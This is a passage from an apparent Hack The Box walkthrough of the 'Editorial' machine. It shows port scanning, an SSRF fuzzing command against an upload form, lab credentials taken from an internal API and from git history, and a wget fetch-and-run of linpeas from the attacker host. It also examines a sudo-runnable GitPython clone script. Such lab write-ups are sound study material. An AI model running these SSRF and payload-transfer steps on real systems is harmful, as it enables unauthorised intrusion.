+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>  22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | ssh-hostkey:
+</span></span><span style="display:flex;"><span>  |   <span style="color:#ae81ff">256</span> 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_  <span style="color:#ae81ff">256</span> 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-title: Did not follow redirect to http://editorial.htb
+</span></span><span style="display:flex;"><span>  No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  TCP/IP fingerprint:
+</span></span><span style="display:flex;"><span>  OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.94SVN%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>12/21%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>33625%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span><span style="color:#ae81ff">676</span>
+</span></span><span style="display:flex;"><span>  OS:6AC33%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>102%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>108%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A
+</span></span><span style="display:flex;"><span>  OS:<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M53CST11NW7%O2<span style="color:#f92672">=</span>M53CST11NW7%O3<span style="color:#f92672">=</span>M53CNNT11NW7%O4<span style="color:#f92672">=</span>M53CST11NW7%O5<span style="color:#f92672">=</span>M53
+</span></span><span style="display:flex;"><span>  OS:CST11NW7%O6<span style="color:#f92672">=</span>M53CST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>FE88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6<span style="color:#f92672">=</span>FE88
+</span></span><span style="display:flex;"><span>  OS:<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M53CNNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+
+</span></span><span style="display:flex;"><span>  OS:%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>
+</span></span><span style="display:flex;"><span>  OS:T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A
+</span></span><span style="display:flex;"><span>  OS:<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPC
+</span></span><span style="display:flex;"><span>  OS:K<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>S<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 35.24 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Findings</strong>:
+<ul>
+<li>We can see the domain is <code>editorial.htb</code>. I add this to <code>/etc/hosts</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Updated Domain &amp; Machine Variables for Testing</strong>:</p>
+<ul>
+<li>Now that I have this information, I can update the <code>domain</code> and <code>machine</code> variables used in tests:
+<ul>
+<li><code>update_var domain &quot;editorial.htb&quot;</code></li>
+<li><code>update_var machine &quot;editorial&quot;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Updating</strong> <code>/etc/hosts</code> <strong>for DNS</strong></p>
+<ul>
+<li>I update my <code>/etc/hosts</code> file:
+<ul>
+<li><code>echo &quot;$box   $domain $machine.$domain&quot; | sudo tee -a /etc/hosts</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="web-80">Web <code>80</code>:</h3>
+<ul>
+<li><strong>Web Enumeration via Burp Suite</strong>:
+<ul>
+<li>When enumerating a website, always use Burp Suite. This allows you to:</li>
+<li>Record all potential injection points.</li>
+<li>Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.</li>
+</ul>
+</li>
+</ul>
+<h4 id="whatweb">Whatweb:</h4>
+<ul>
+<li>Lets run &ldquo;whatweb&rdquo; to see if we can glean some further information:
+<ul>
+<li>
+<p><code>whatweb $box</code></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Editorial/scans/nmap%20%20%f0%9f%8d%a3%20main%20%f0%9f%9b%a4%ef%b8%8f%20%20%c3%971%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2011:55:43%20zsh%20%e2%9d%af%20whatweb%20$box%0ahttp://10.129.206.26%20[301%20Moved%20Permanently]%20Country[RESERVED][ZZ],%20HTTPServer[Ubuntu%20Linux][nginx/1.18.0%20%28Ubuntu%29],%20IP[10.129.206.26],%20RedirectLocation[http://editorial.htb],%20Title[301%20Moved%20Permanently],%20nginx[1.18.0]%0a%0ahttp://editorial.htb%20[200%20OK]%20Bootstrap,%20Country[RESERVED][ZZ],%20HTML5,%20HTTPServer[Ubuntu%20Linux][nginx/1.18.0%20%28Ubuntu%29],%20IP[10.129.206.26],%20Title[Editorial%20Tiempo%20Arriba],%20X-UA-Compatible[IE=edge],%20nginx[1.18.0]">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Editorial/scans/nmap  🍣 main 🛤️  ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 11:55:43 zsh ❯ whatweb $box
+</span></span><span style="display:flex;"><span>http://10.129.206.26 <span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.206.26<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://editorial.htb<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://editorial.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.206.26<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Editorial Tiempo Arriba<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Nothing especially interesting, we can see the site is using HTML5, nginx 1.18.0 and bootstrap.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="dirbusting-the-webserver-using-ffuf">Dirbusting the webserver using ffuf:</h4>
+<ul>
+<li><strong>I Perform some directory busting to see if there are any interesting directories</strong>:
+<ul>
+<li><code>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$domain/FUZZ -fc 403 -ic</code>
+<ul>
+<li>But there was only <code>upload</code> &amp; <code>about</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="visiting-the-web-page">Visiting the web page:</h4>
+<ul>
+<li>
+<p>It&rsquo;s always good to just manually click around and manually enumerate the pages available.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-120126_.png">
+</figure>
+</li>
+<li>It appears to be a publishing website.</li>
+</ul>
+</li>
+<li>
+<p>Looking at the <code>/about</code> page we can see there is an email present <code>submissions@tiempoarriba.htb</code></p>
+<ul>
+<li>Let&rsquo;s keep track of this as it may come in use later.</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-the-publish-with-us-page-for-injection-points">Enumerating the &ldquo;Publish With Us&rdquo; page for injection points:</h4>
+<ul>
+<li>
+<p>We can see that the &ldquo;Publish With Us&rdquo; allows us to uplaod a file as well as enter a url for the Cover. Lets test these injection points.</p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-12-21-120159_.png">
+</figure>
+
+</li>
+<li>
+<p>I fill it with the following details to see the response:</p>
+<ul>
+<li>
+<p>I setup a simple python webserver on my host and enter this address as the URL cover url to see if I can have the site actively call out to this address.</p>
+</li>
+<li>
+<p>I add a simple <code>.php</code> webshell</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-133315_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I hit the &ldquo;Preview&rdquo; button.</p>
+<ul>
+<li>As we can see it does in fact call out and connect to our server.</li>
+<li><figure><img src="/ox-hugo/2024-12-21-133406_.png">
+</figure>
+</li>
+<li>Looking at the response for the request in burp we can see we are provided a url for a <code>static/uploads</code> folder and then a GUID of the uploaded file. We can also see that there is no file restrictions on the uploaded file. So we can pass our shell.php file.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-135704_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I navigate to the url but cannot access it:
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-135613_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I pass the url with the GUID as the cover url &amp; supply a command &ldquo;whoami&rdquo; to see if we can access it via SSRF and have our commands trigger but it does not work.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-140132_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>For the remaining fields I prefix with &ldquo;test&rdquo; and then the description of the field. (I do this as I want see how they are processed and possible rendered once I hit &ldquo;Send Book Info&rdquo;)</li>
+</ul>
+<h3 id="fuzzing-for-ssrf-with-ffuf">Fuzzing for SSRF with ffuf:</h3>
+<p>As we know the server will try and connect to an endpoint we can fuzz on localhost (127.0.01) for SSRF, by performing a port scan on the host. This will tell us if we can access any locally running services on the host and at the same time if SSRF is a viable path.</p>
+<ul>
+<li>
+<p>I use the copy as curl command option in burp to copy my <code>POST</code> request:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-142424_.png">
+</figure>
+</li>
+<li>+Note+: I verified I could still enter a url without uploading a file and it reach out to my python server and it worked as expected.</li>
+</ul>
+</li>
+<li>
+<p>I create a port list to use:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="seq%201%2065535%20%3e%20Ports.txt">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65535</span> &gt; Ports.txt</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I modify the curl command so it can be used with ffuf:
+<ul>
+<li>adding the wordlist <code>-w</code></li>
+<li>specifying the url <code>-u</code></li>
+<li>adding the injection point:
+<ul>
+<li><code>http://127.0.0.1:FUZZ</code></li>
+</ul>
+</li>
+<li>Removing the newlines and making 1 line</li>
+<li>Proxying all traffic via burp
+<ul>
+<li><code>-x http://127.0.0.1:8080</code></li>
+</ul>
+</li>
+<li>Remove size of 61 <code>-fs 61</code>
+<ul>
+<li>This can only be done once we have the initial response so we can then filter for the standard response.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="ffuf%20-w%20~/Wordlists/45.06-CustomWordlists/Ports.txt%20-u%20%27http://editorial.htb/upload-cover%27%20-X%20$%27POST%27%20-H%20$%27Host:%20editorial.htb%27%20-H%20$%27Content-Length:%20315%27%20-H%20$%27Accept-Language:%20en-US,en;q=0.9%27%20-H%20$%27User-Agent:%20Mozilla/5.0%20%28Windows%20NT%2010.0;%20Win64;%20x64%29%20AppleWebKit/537.36%20%28KHTML,%20like%20Gecko%29%20Chrome/130.0.6723.70%20Safari/537.36%27%20-H%20$%27Content-Type:%20multipart/form-data;%20boundary=----WebKitFormBoundaryAKLIgaiMMQNJmTJ6%27%20-H%20$%27Accept:%20*/*%27%20-H%20$%27Origin:%20http://editorial.htb%27%20-H%20$%27Referer:%20http://editorial.htb/upload%27%20-H%20$%27Accept-Encoding:%20gzip,%20deflate,%20br%27%20-H%20$%27Connection:%20keep-alive%27%20-d%20$%27------WebKitFormBoundaryAKLIgaiMMQNJmTJ6%5cx0d%5cx0aContent-Disposition:%20form-data;%20name=%5c%22bookurl%5c%22%5cx0d%5cx0a%5cx0d%5cx0ahttp://127.0.0.1:FUZZ%5cx0d%5cx0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6%5cx0d%5cx0aContent-Disposition:%20form-data;%20name=%5c%22bookfile%5c%22;%20filename=%5c%22%5c%22%5cx0d%5cx0aContent-Type:%20application/octet-stream%5cx0d%5cx0a%5cx0d%5cx0a%5cx0d%5cx0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6--%5cx0d%5cx0a%27%20-x%20http://127.0.0.1:8080%20-fs%2061">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w ~/Wordlists/45.06-CustomWordlists/Ports.txt -u <span style="color:#e6db74">&#39;http://editorial.htb/upload-cover&#39;</span> -X <span style="color:#e6db74">$&#39;POST&#39;</span> -H <span style="color:#e6db74">$&#39;Host: editorial.htb&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 315&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAKLIgaiMMQNJmTJ6&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: */*&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://editorial.htb&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://editorial.htb/upload&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> -d <span style="color:#e6db74">$&#39;------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\x0d\x0aContent-Disposition: form-data; name=\&#34;bookurl\&#34;\x0d\x0a\x0d\x0ahttp://127.0.0.1:FUZZ\x0d\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\x0d\x0aContent-Disposition: form-data; name=\&#34;bookfile\&#34;; filename=\&#34;\&#34;\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6--\x0d\x0a&#39;</span> -x http://127.0.0.1:8080 -fs <span style="color:#ae81ff">61</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p>I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-143308_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>We get a hit on port <code>5000</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-143455_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="abusing-ssrf-to-access-internal-api-endpoints">Abusing SSRF To Access Internal API Endpoints:</h3>
+<ul>
+<li>
+<p>I enter this IP into the url box and we can see we are given the <code>static/upload/GUID</code> response again:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-145805_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I enter the url into my browser and the file downloads. When I look at the file it looks to be API information in <code>json</code> format:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-150020_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Looking at the contents we can see it&rsquo;s information on an API running on the 5000 endpoint:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-150526_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I load these endpoints into burp intruder and query each endpoint</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-151804_.png">
+</figure>
+</li>
+<li>+Note+: I tried this but for some reason when I attempted to download the returned files it would always fail. Instead I manually queried the endpoint, quickly extracted the string and downloaded the file. There may be a time limit on the files uploaded potentially.</li>
+</ul>
+</li>
+</ul>
+<h3 id="retrieving-default-credentials-from-the-authors-api-endpoint">Retrieving default credentials from the &ldquo;authors&rdquo; API endpoint:</h3>
+<ul>
+<li>The endpoint <code>http://127.0.0.1:5000/api/latest/metadata/messages/authors</code> contained the following message which appears to be sent to new authors &amp; it contained default creds:
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-155343_.png">
+</figure>
+</li>
+<li><code>dev:dev080217_devAPI!@</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="accessing-the-host-by-ssh-as-dev">Accessing the host by SSH as dev:</h3>
+<ul>
+<li>
+<p>I try these on the ssh service &amp; they work:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-155513_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Lets get our flag:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-053332_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-host-as-dev">Enumerating the host as dev:</h3>
+<h4 id="running-linpeas">Running Linpeas:</h4>
+<ul>
+<li>I transfer linpeas over using a simple python http server.
+<ul>
+<li>On my attack host:
+<ul>
+<li>On my host I navigate to where I have the <code>linpeas.sh</code> file stored.</li>
+<li>I run <code>python -m http.server 9000</code></li>
+</ul>
+</li>
+<li>On the target
+<ul>
+<li>I navigate to <code>/tmp</code> as it&rsquo;s always world writable.</li>
+<li>I transfer the file using wget.
+<ul>
+<li><code>wget http://10.10.14.80:9000/linpeas.sh</code></li>
+<li><figure><img src="/ox-hugo/2024-12-22-054131_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Make it executable <code>chmod +x linpeas.sh</code></li>
+<li>Run it <code>./linpeas.sh</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>It finds nothing of note.</li>
+</ul>
+<h4 id="finding-prod-user-password-in-git-commits">Finding prod user password in git commits:</h4>
+<ul>
+<li>
+<p>Looking at our users home folder we can see they have an <code>apps</code> folder however it is empty.</p>
+</li>
+<li>
+<p>Looking further we can see it has a <code>.git</code> folder, meaning this was once at some point initialized as a git repo or was intended to be a git repo, which means either files have been deleted or never added. Luckily we can query the <code>.git</code> logs to check if files were ever present.</p>
+</li>
+<li>
+<p>I run <code>git log --oneline</code> and we are shown a list of previous commits, which means this was an active repo but the files have since been deleted. On the left hand side we can see the git commit hash and to the right the commit message supplied by the user for the commit.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-065734_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Looking at the commit messages we can see an interesting one &ldquo;downgrading prod to dev&rdquo;, now given we were able to retrieve clear text passwords from the API endpoint previously I would imagine we can find clear text creds for prod here too.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-065911_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I use <code>git log -p b73481b</code> to read the changes.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-071238_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Looking at the changes we can see the following. The text in red signifies it was deleted and the text in green signifies it was added &amp; looking at the contents we can see it contains clear text creds for the prod account.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-071308_.png">
+</figure>
+</li>
+<li><code>prod:080217_Producti0n_2023!@</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-lateral-movement">3. Lateral Movement:</h2>
+<h3 id="enumerating-as-prod">Enumerating as prod:</h3>
+<ul>
+<li>
+<p>I su user to prod and it works.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-071534_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I check what <code>sudo</code> command&rsquo;s prod can run if any:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-22-071712_.png">
+</figure>
+</li>
+<li>We can see that we can run python3 as sudo and run the script <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code> the fact the script is followed by the wildcard symbol <code>*</code> implies we can pass any arguments to this script and have it run as root</li>
+</ul>
+</li>
+<li>
+<p>Reading the contents of the script we can see it contains the following code:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#!/usr/bin/python3%0aimport%20o%20%20%20%20%20%20%20%20s%0aimport%20sys%0afrom%20git%20import%20Repo%0a%0aos.chdir%28%27/opt/internal_apps/clone_changes%27%29%0a%0aurl_to_clone%20=%20sys.argv[1]%0a%0ar%20=%20Repo.init%28%27%27,%20bare=True%29%0ar.clone_from%28url_to_clone,%20%27new_changes%27,%20multi_options=[%22-c%20protocol.ext.allow=always%22]%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> o        s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> git <span style="color:#f92672">import</span> Repo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#39;/opt/internal_apps/clone_changes&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url_to_clone <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> Repo<span style="color:#f92672">.</span>init(<span style="color:#e6db74">&#39;&#39;</span>, bare<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>clone_from(url_to_clone, <span style="color:#e6db74">&#39;new_changes&#39;</span>, multi_options<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;-c protocol.ext.allow=always&#34;</span>])</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This all looks pretty standard. We import OS, to interact with the operating system &amp; sys to take cli args for the script. We then import Repo from Git.</li>
+</ul>
+</li>
+</ul>
+<h4 id="code-breakdown-and-explanation-of-vulnerability">Code Breakdown and explanation of vulnerability:</h4>
+<ol>
+<li>
+<p><strong>Imports and Setup</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="import%20sys%0afrom%20git%20import%20Repo%0aimport%20os">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> git <span style="color:#f92672">import</span> Repo
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><code>sys</code>: Used to access command-line arguments.</li>
+<li><code>git.Repo</code>: From the GitPython library, allows interaction with Git repositories.</li>
+<li><code>os</code>: Used to interact with the host os.</li>
+</ul>
+</li>
+<li>
+<p><strong>Change Working Directory</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
